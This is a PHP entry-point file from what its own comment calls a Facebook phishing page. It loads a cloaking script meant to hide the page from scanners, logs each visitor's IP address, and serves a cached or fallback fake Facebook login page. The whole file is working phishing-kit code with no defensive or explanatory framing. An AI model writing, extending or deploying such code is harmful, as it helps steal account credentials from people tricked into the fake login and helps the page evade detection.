<?php
/**
 * Facebook phishing page entry point
 * 
 * The router.php handles directory resolution.
 * This file just needs to serve the page.
 */

// If _cloak.php exists in the parent directory, load it
$cloak_path = __DIR__ . '/../_cloak.php';
if (file_exists($cloak_path)) {
    require_once $cloak_path;
}

// Include ip.php to log the visitor
$ip_path = __DIR__ . '/ip.php';
if (file_exists($ip_path)) {
    include $ip_path;
}

// Serve the cached dynamic page
$cache_path = __DIR__ . '/cache.php';
if (file_exists($cache_path)) {
    require $cache_path;
} else {
    // Fallback: serve login.html directly
    readfile(__DIR__ . '/login.html');
}
?>